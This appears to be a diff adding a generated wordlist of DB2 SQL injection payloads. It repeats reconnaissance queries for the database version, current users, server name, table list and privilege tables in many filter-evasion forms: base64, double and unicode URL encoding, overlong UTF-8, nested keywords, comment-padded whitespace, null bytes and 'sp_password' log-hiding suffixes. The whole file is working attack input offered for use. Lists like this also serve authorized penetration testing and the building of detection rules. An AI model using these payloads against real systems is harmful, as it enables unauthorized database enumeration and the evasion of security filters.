@@ -1,0 +1,864 @@
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+%00
+c2VsZWN0IHZlcnNpb25udW1iZXIsIHZlcnNpb25fdGltZXN0YW1wIGZyb20gc3lzaWJtLnN5c3ZlcnNpb25zOwo=
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+%2573%2565%256C%2565%2563%2574%2520%2576%2565%2572%2573%2569%256F%256E%256E%2575%256D%2562%2565%2572%252C%2520%2576%2565%2572%2573%2569%256F%256E%255F%2574%2569%256D%2565%2573%2574%2561%256D%2570%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2576%2565%2572%2573%2569%256F%256E%2573%253B%250A
+%73%65%6C%65%63%74%20%76%65%72%73%69%6F%6E%6E%75%6D%62%65%72%2C%20%76%65%72%73%69%6F%6E%5F%74%69%6D%65%73%74%61%6D%70%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%76%65%72%73%69%6F%6E%73%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u006E%u0075%u006D%u0062%u0065%u0072%u002C%u0020%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u005F%u0074%u0069%u006D%u0065%u0073%u0074%u0061%u006D%u0070%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0073%u003B%u000A
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select /*!30194versionnumber, version_timestamp from sysibm.sysversions;
+*/
+select /*!00000versionnumber, version_timestamp from sysibm.sysversions;
+*/
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+SELECSELECTT versionnumber, version_timestamp FFROMROM sysibm.sysversions;
+
+select%C0%AAversionnumber%C0%AE%C0%AAversion%C0%DFtimestamp%C0%AAfrom%C0%AAsysibm%C0%AEsysversions%C0%BB%C0%8A
+%s%e%l%e%c%t %v%e%r%s%i%o%n%n%u%m%b%e%r%, %v%e%r%s%i%o%n%_%t%i%m%e%s%t%a%m%p %f%r%o%m %s%y%s%i%b%m%.%s%y%s%v%e%r%s%i%o%n%s%;%
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+ and '0having'='0having'
+select versionnumber, version_timestamp from sysibm.sysversions;
+-- sp_password
+select/**/versionnumber,/**/version_timestamp/**/from/**/sysibm.sysversions;
+
+select--pNdleIHSHNj%0Aversionnumber,--Jskywr%0Aversion_timestamp--ekmhaItd%0Afrom--amxwzW%0Asysibm.sysversions;--mMGrkPDQhgDh%0A
+select%23fJSgfQDvEMf%0Aversionnumber,%23uxhCUPg%0Aversion_timestamp%23hNVpcBQaoPCh%0Afrom%23yfbnFTWpK%0Asysibm.sysversions;%23ixFYAziBOrD%0A
+select%23taNYqKqWBH%0Aversionnumber,%23yMPmYnmezMPH%0Aversion_timestamp%23xOxqXrUuWLQz%0Afrom%23FRfyGxlalK%0Asysibm.sysversions;%23QCRkrfr%0A
+select%05versionnumber,%09version_timestamp%0Efrom%0Csysibm.sysversions;
+
+select%23%0Aversionnumber,%23%0Aversion_timestamp%23%0Afrom%23%0Asysibm.sysversions;%23%0A
+select%0Cversionnumber,%0Cversion_timestamp%0Dfrom%09sysibm.sysversions;
+
+select--%0Aversionnumber,--%0Aversion_timestamp--%0Afrom--%0Asysibm.sysversions;--%0A
+select+versionnumber,+version_timestamp+from+sysibm.sysversions;
+
+select%09versionnumber,%0Aversion_timestamp%0Cfrom%09sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select versionnumber, version_timestamp from sysibm.sysversions;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+%00
+c2VsZWN0IHVzZXIgZnJvbSBzeXNpYm0uc3lzZHVtbXkxOwo=
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+%2573%2565%256C%2565%2563%2574%2520%2575%2573%2565%2572%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2564%2575%256D%256D%2579%2531%253B%250A
+%73%65%6C%65%63%74%20%75%73%65%72%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%64%75%6D%6D%79%31%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0075%u0073%u0065%u0072%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0064%u0075%u006D%u006D%u0079%u0031%u003B%u000A
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select /*!30302user from sysibm.sysdummy1;
+*/
+select /*!00000user from sysibm.sysdummy1;
+*/
+select user from sysibm.sysdummy1;
+
+SELESELECTCT user FROFROMM sysibm.sysdummy1;
+
+select%C0%AAuser%C0%AAfrom%C0%AAsysibm%C0%AEsysdummy1%C0%BB%C0%8A
+%s%e%l%e%c%t %u%s%e%r %f%r%o%m %s%y%s%i%b%m%.%s%y%s%d%u%m%m%y%1%;%
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+ and '0having'='0having'
+select user from sysibm.sysdummy1;
+-- sp_password
+select/**/user/**/from/**/sysibm.sysdummy1;
+
+select--jXzpbSvxM%0Auser--bmuizRPgUEe%0Afrom--yLcGDutA%0Asysibm.sysdummy1;--fEVJySCLPLzC%0A
+select%23TJJcgp%0Auser%23eMyWMrJkA%0Afrom%23DICpsVsT%0Asysibm.sysdummy1;%23BNdVAmluEn%0A
+select%23rhJWSWPzcJI%0Auser%23KTZhjYRP%0Afrom%23wUaVxQw%0Asysibm.sysdummy1;%23QgZVJHGJV%0A
+select%0Duser%0Ffrom%0Dsysibm.sysdummy1;
+
+select%23%0Auser%23%0Afrom%23%0Asysibm.sysdummy1;%23%0A
+select%0Auser%0Cfrom%09sysibm.sysdummy1;
+
+select--%0Auser--%0Afrom--%0Asysibm.sysdummy1;--%0A
+select+user+from+sysibm.sysdummy1;
+
+select%0Cuser%0Cfrom%0Asysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+%00
+c2VsZWN0IHNlc3Npb25fdXNlciBmcm9tIHN5c2libS5zeXNkdW1teTE7Cg==
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+%2573%2565%256C%2565%2563%2574%2520%2573%2565%2573%2573%2569%256F%256E%255F%2575%2573%2565%2572%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2564%2575%256D%256D%2579%2531%253B%250A
+%73%65%6C%65%63%74%20%73%65%73%73%69%6F%6E%5F%75%73%65%72%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%64%75%6D%6D%79%31%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0073%u0065%u0073%u0073%u0069%u006F%u006E%u005F%u0075%u0073%u0065%u0072%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0064%u0075%u006D%u006D%u0079%u0031%u003B%u000A
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select /*!30816session_user from sysibm.sysdummy1;
+*/
+select /*!00000session_user from sysibm.sysdummy1;
+*/
+select session_user from sysibm.sysdummy1;
+
+SESELECTLECT session_user FRFROMOM sysibm.sysdummy1;
+
+select%C0%AAsession%C0%DFuser%C0%AAfrom%C0%AAsysibm%C0%AEsysdummy1%C0%BB%C0%8A
+%s%e%l%e%c%t %s%e%s%s%i%o%n%_%u%s%e%r %f%r%o%m %s%y%s%i%b%m%.%s%y%s%d%u%m%m%y%1%;%
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+ and '0having'='0having'
+select session_user from sysibm.sysdummy1;
+-- sp_password
+select/**/session_user/**/from/**/sysibm.sysdummy1;
+
+select--SJgces%0Asession_user--sxBWzJFhK%0Afrom--xWvChe%0Asysibm.sysdummy1;--ETAIKxhAdY%0A
+select%23VTlpYGypKxcw%0Asession_user%23QKjQLRMWdk%0Afrom%23sUKWzgvX%0Asysibm.sysdummy1;%23ArxRFCG%0A
+select%23KSkRVH%0Asession_user%23RCzlZFycxZ%0Afrom%23XhbYsLUKZ%0Asysibm.sysdummy1;%23PKbiatZwim%0A
+select%06session_user%0Bfrom%0Csysibm.sysdummy1;
+
+select%23%0Asession_user%23%0Afrom%23%0Asysibm.sysdummy1;%23%0A
+select%0Dsession_user%0Cfrom%09sysibm.sysdummy1;
+
+select--%0Asession_user--%0Afrom--%0Asysibm.sysdummy1;--%0A
+select+session_user+from+sysibm.sysdummy1;
+
+select%0Dsession_user%0Afrom%09sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select session_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+%00
+c2VsZWN0IHN5c3RlbV91c2VyIGZyb20gc3lzaWJtLnN5c2R1bW15MTsK
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+%2573%2565%256C%2565%2563%2574%2520%2573%2579%2573%2574%2565%256D%255F%2575%2573%2565%2572%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2564%2575%256D%256D%2579%2531%253B%250A
+%73%65%6C%65%63%74%20%73%79%73%74%65%6D%5F%75%73%65%72%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%64%75%6D%6D%79%31%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0073%u0079%u0073%u0074%u0065%u006D%u005F%u0075%u0073%u0065%u0072%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0064%u0075%u006D%u006D%u0079%u0031%u003B%u000A
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select /*!30156system_user from sysibm.sysdummy1;
+*/
+select /*!00000system_user from sysibm.sysdummy1;
+*/
+select system_user from sysibm.sysdummy1;
+
+SELECSELECTT system_user FROFROMM sysibm.sysdummy1;
+
+select%C0%AAsystem%C0%DFuser%C0%AAfrom%C0%AAsysibm%C0%AEsysdummy1%C0%BB%C0%8A
+%s%e%l%e%c%t %s%y%s%t%e%m%_%u%s%e%r %f%r%o%m %s%y%s%i%b%m%.%s%y%s%d%u%m%m%y%1%;%
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+ and '0having'='0having'
+select system_user from sysibm.sysdummy1;
+-- sp_password
+select/**/system_user/**/from/**/sysibm.sysdummy1;
+
+select--azTAztRr%0Asystem_user--mweIsCGL%0Afrom--uJqxSm%0Asysibm.sysdummy1;--hnGKdF%0A
+select%23jnNzHY%0Asystem_user%23AnDmrI%0Afrom%23ykcfouShuLc%0Asysibm.sysdummy1;%23UNDbgtAcx%0A
+select%23tVhGBd%0Asystem_user%23IwTuIWoZzTX%0Afrom%23AJeoCZfehwR%0Asysibm.sysdummy1;%23DpVCGyf%0A
+select%09system_user%04from%04sysibm.sysdummy1;
+
+select%23%0Asystem_user%23%0Afrom%23%0Asysibm.sysdummy1;%23%0A
+select%09system_user%0Afrom%0Bsysibm.sysdummy1;
+
+select--%0Asystem_user--%0Afrom--%0Asysibm.sysdummy1;--%0A
+select+system_user+from+sysibm.sysdummy1;
+
+select%0Asystem_user%0Afrom%0Asysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select system_user from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+%00
+c2VsZWN0IGN1cnJlbnQgc2VydmVyIGZyb20gc3lzaWJtLnN5c2R1bW15MTsK
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%2520%2573%2565%2572%2576%2565%2572%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2564%2575%256D%256D%2579%2531%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%20%73%65%72%76%65%72%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%64%75%6D%6D%79%31%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u0020%u0073%u0065%u0072%u0076%u0065%u0072%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0064%u0075%u006D%u006D%u0079%u0031%u003B%u000A
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select /*!30521current server from sysibm.sysdummy1;
+*/
+select /*!00000current server from sysibm.sysdummy1;
+*/
+select current server from sysibm.sysdummy1;
+
+SELECSELECTT current server FROFROMM sysibm.sysdummy1;
+
+select%C0%AAcurrent%C0%AAserver%C0%AAfrom%C0%AAsysibm%C0%AEsysdummy1%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t %s%e%r%v%e%r %f%r%o%m %s%y%s%i%b%m%.%s%y%s%d%u%m%m%y%1%;%
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+ and '0having'='0having'
+select current server from sysibm.sysdummy1;
+-- sp_password
+select/**/current/**/server/**/from/**/sysibm.sysdummy1;
+
+select--yMYaKdfjWiC%0Acurrent--zsfWncbpP%0Aserver--TQJqui%0Afrom--GORIeKjgNU%0Asysibm.sysdummy1;--KxrVBitRmpR%0A
+select%23WDSeONkuFoJM%0Acurrent%23DSwIsPRgvc%0Aserver%23jUTvNil%0Afrom%23ncdgBqQoVf%0Asysibm.sysdummy1;%23VEGoBW%0A
+select%23MFhPHepBI%0Acurrent%23NnPqYU%0Aserver%23qjUzssFK%0Afrom%23RbfbRMRr%0Asysibm.sysdummy1;%23ALmiDsaBDywe%0A
+select%0Fcurrent%02server%0Ffrom%02sysibm.sysdummy1;
+
+select%23%0Acurrent%23%0Aserver%23%0Afrom%23%0Asysibm.sysdummy1;%23%0A
+select%0Acurrent%09server%0Cfrom%0Bsysibm.sysdummy1;
+
+select--%0Acurrent--%0Aserver--%0Afrom--%0Asysibm.sysdummy1;--%0A
+select+current+server+from+sysibm.sysdummy1;
+
+select%0Ccurrent%09server%0Dfrom%0Asysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select current server from sysibm.sysdummy1;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+%00
+c2VsZWN0IG5hbWUgZnJvbSBzeXNpYm0uc3lzdGFibGVzOwo=
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+%2573%2565%256C%2565%2563%2574%2520%256E%2561%256D%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2574%2561%2562%256C%2565%2573%253B%250A
+%73%65%6C%65%63%74%20%6E%61%6D%65%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%74%61%62%6C%65%73%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u006E%u0061%u006D%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0074%u0061%u0062%u006C%u0065%u0073%u003B%u000A
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select /*!30612name from sysibm.systables;
+*/
+select /*!00000name from sysibm.systables;
+*/
+select name from sysibm.systables;
+
+SELESELECTCT name FFROMROM sysibm.systables;
+
+select%C0%AAname%C0%AAfrom%C0%AAsysibm%C0%AEsystables%C0%BB%C0%8A
+%s%e%l%e%c%t %n%a%m%e %f%r%o%m %s%y%s%i%b%m%.%s%y%s%t%a%b%l%e%s%;%
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+ and '0having'='0having'
+select name from sysibm.systables;
+-- sp_password
+select/**/name/**/from/**/sysibm.systables;
+
+select--aDHNwaFN%0Aname--sKPBOcKC%0Afrom--hUPBAzeP%0Asysibm.systables;--FzGScHAYGeNa%0A
+select%23eKxdIo%0Aname%23yitrRCEP%0Afrom%23mwDchVlAMY%0Asysibm.systables;%23GsHnxPQEu%0A
+select%23TrLCYQkD%0Aname%23FrfLOtAsLaQ%0Afrom%23KJXKpaBTzCM%0Asysibm.systables;%23mMheFJI%0A
+select%0Bname%05from%01sysibm.systables;
+
+select%23%0Aname%23%0Afrom%23%0Asysibm.systables;%23%0A
+select%09name%0Dfrom%0Dsysibm.systables;
+
+select--%0Aname--%0Afrom--%0Asysibm.systables;--%0A
+select+name+from+sysibm.systables;
+
+select%0Cname%0Cfrom%0Csysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select name from sysibm.systables;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+%00
+c2VsZWN0IGdyYW50ZWUgZnJvbSBzeXNjYXQuZGJhdXRoOwo=
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+%2573%2565%256C%2565%2563%2574%2520%2567%2572%2561%256E%2574%2565%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%2563%2561%2574%252E%2564%2562%2561%2575%2574%2568%253B%250A
+%73%65%6C%65%63%74%20%67%72%61%6E%74%65%65%20%66%72%6F%6D%20%73%79%73%63%61%74%2E%64%62%61%75%74%68%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0067%u0072%u0061%u006E%u0074%u0065%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0063%u0061%u0074%u002E%u0064%u0062%u0061%u0075%u0074%u0068%u003B%u000A
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select /*!30387grantee from syscat.dbauth;
+*/
+select /*!00000grantee from syscat.dbauth;
+*/
+select grantee from syscat.dbauth;
+
+SSELECTELECT grantee FRFROMOM syscat.dbauth;
+
+select%C0%AAgrantee%C0%AAfrom%C0%AAsyscat%C0%AEdbauth%C0%BB%C0%8A
+%s%e%l%e%c%t %g%r%a%n%t%e%e %f%r%o%m %s%y%s%c%a%t%.%d%b%a%u%t%h%;%
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+ and '0having'='0having'
+select grantee from syscat.dbauth;
+-- sp_password
+select/**/grantee/**/from/**/syscat.dbauth;
+
+select--BBXyZxSqqclJ%0Agrantee--xaljVGNrBDM%0Afrom--etothoddu%0Asyscat.dbauth;--shANZBB%0A
+select%23VyyZsEH%0Agrantee%23UgawhFjzKcq%0Afrom%23yDiiFuSQPvy%0Asyscat.dbauth;%23uUHVbnTchP%0A
+select%23umWbubHAKl%0Agrantee%23IwdOmokRpSC%0Afrom%23WAlGmshmpQKe%0Asyscat.dbauth;%23HnvEBFX%0A
+select%0Bgrantee%0Cfrom%03syscat.dbauth;
+
+select%23%0Agrantee%23%0Afrom%23%0Asyscat.dbauth;%23%0A
+select%0Cgrantee%0Cfrom%0Dsyscat.dbauth;
+
+select--%0Agrantee--%0Afrom--%0Asyscat.dbauth;--%0A
+select+grantee+from+syscat.dbauth;
+
+select%0Dgrantee%09from%09syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select grantee from syscat.dbauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+%00
+c2VsZWN0ICogZnJvbSBzeXNjYXQudGFiYXV0aDsK
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2573%2579%2573%2563%2561%2574%252E%2574%2561%2562%2561%2575%2574%2568%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%73%79%73%63%61%74%2E%74%61%62%61%75%74%68%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0063%u0061%u0074%u002E%u0074%u0061%u0062%u0061%u0075%u0074%u0068%u003B%u000A
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select /*!30500* from syscat.tabauth;
+*/
+select /*!00000* from syscat.tabauth;
+*/
+select * from syscat.tabauth;
+
+SELSELECTECT * FRFROMOM syscat.tabauth;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAsyscat%C0%AEtabauth%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %s%y%s%c%a%t%.%t%a%b%a%u%t%h%;%
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+ and '0having'='0having'
+select * from syscat.tabauth;
+-- sp_password
+select/**/*/**/from/**/syscat.tabauth;
+
+select--RsYXCIoJDuMv%0A*--kCBWMTGFOw%0Afrom--YQZlSrinlYaQ%0Asyscat.tabauth;--ZhoQGIL%0A
+select%23kMiTzI%0A*%23twmQfJMVsZ%0Afrom%23WClwjOzQSTsm%0Asyscat.tabauth;%23LdiKQF%0A
+select%23LvGrlN%0A*%23SayxQQtz%0Afrom%23fDABclpjnrCk%0Asyscat.tabauth;%23RyWNcON%0A
+select%03*%09from%06syscat.tabauth;
+
+select%23%0A*%23%0Afrom%23%0Asyscat.tabauth;%23%0A
+select%0D*%0Cfrom%09syscat.tabauth;
+
+select--%0A*--%0Afrom--%0Asyscat.tabauth;--%0A
+select+*+from+syscat.tabauth;
+
+select%0D*%09from%09syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.tabauth;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+%00
+c2VsZWN0ICogZnJvbSBzeXNjYXQuZGJhdXRoIHdoZXJlIGdyYW50ZWUgPSBjdXJyZW50IHVzZXI7Cg==
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee LIKE current user;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2573%2579%2573%2563%2561%2574%252E%2564%2562%2561%2575%2574%2568%2520%2577%2568%2565%2572%2565%2520%2567%2572%2561%256E%2574%2565%2565%2520%253D%2520%2563%2575%2572%2572%2565%256E%2574%2520%2575%2573%2565%2572%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%73%79%73%63%61%74%2E%64%62%61%75%74%68%20%77%68%65%72%65%20%67%72%61%6E%74%65%65%20%3D%20%63%75%72%72%65%6E%74%20%75%73%65%72%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0063%u0061%u0074%u002E%u0064%u0062%u0061%u0075%u0074%u0068%u0020%u0077%u0068%u0065%u0072%u0065%u0020%u0067%u0072%u0061%u006E%u0074%u0065%u0065%u0020%u003D%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u0020%u0075%u0073%u0065%u0072%u003B%u000A
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where granteeLIKEcurrent user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select /*!30957* from syscat.dbauth where grantee = current user;
+*/
+select /*!00000* from syscat.dbauth where grantee = current user;
+*/
+select * from syscat.dbauth where grantee = current user;
+
+SELESELECTCT * FRFROMOM syscat.dbauth WHEWHERERE grantee = current user;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAsyscat%C0%AEdbauth%C0%AAwhere%C0%AAgrantee%C0%AA%C0%BF%C0%AAcurrent%C0%AAuser%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %s%y%s%c%a%t%.%d%b%a%u%t%h %w%h%e%r%e %g%r%a%n%t%e%e %= %c%u%r%r%e%n%t %u%s%e%r%;%
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+ and '0having'='0having'
+select * from syscat.dbauth where grantee = current user;
+-- sp_password
+select/**/*/**/from/**/syscat.dbauth/**/where/**/grantee/**/=/**/current/**/user;
+
+select--FaAIMeQcCN%0A*--pQiDgfZMMQ%0Afrom--PTPQTxoeK%0Asyscat.dbauth--QqmCYyNF%0Awhere--KEVKBL%0Agrantee--ZglKrLhvX%0A=--rzTZZjMqEnBC%0Acurrent--crkQotl%0Auser;--MBsPvo%0A
+select%23vINpDVZux%0A*%23KsdfpTEBJLqI%0Afrom%23jXUExCqoRAbU%0Asyscat.dbauth%23yPZkPySsMtqk%0Awhere%23CiljXIkNnab%0Agrantee%23tJslKNaZZGj%0A=%23ofIcGgfbY%0Acurrent%23JNyXQQ%0Auser;%23MhCpTcsDx%0A
+select%23NyVwaZoYFU%0A*%23TtTEzELac%0Afrom%23pKbJwqF%0Asyscat.dbauth%23erEztuLx%0Awhere%23yVwSFYvTwJ%0Agrantee%23RRlAUfFAb%0A=%23MuGcgKmZ%0Acurrent%23TkbCCHUV%0Auser;%23xOHaLP%0A
+select%0F*%05from%0Fsyscat.dbauth%03where%0Fgrantee%06=%04current%04user;
+
+select%23%0A*%23%0Afrom%23%0Asyscat.dbauth%23%0Awhere%23%0Agrantee%23%0A=%23%0Acurrent%23%0Auser;%23%0A
+select%09*%09from%0Bsyscat.dbauth%0Bwhere%0Cgrantee%0C=%0Acurrent%0Auser;
+
+select--%0A*--%0Afrom--%0Asyscat.dbauth--%0Awhere--%0Agrantee--%0A=--%0Acurrent--%0Auser;--%0A
+select+*+from+syscat.dbauth+where+grantee+=+current+user;
+
+select%0A*%09from%0Dsyscat.dbauth%09where%09grantee%09=%09current%0Auser;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.dbauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
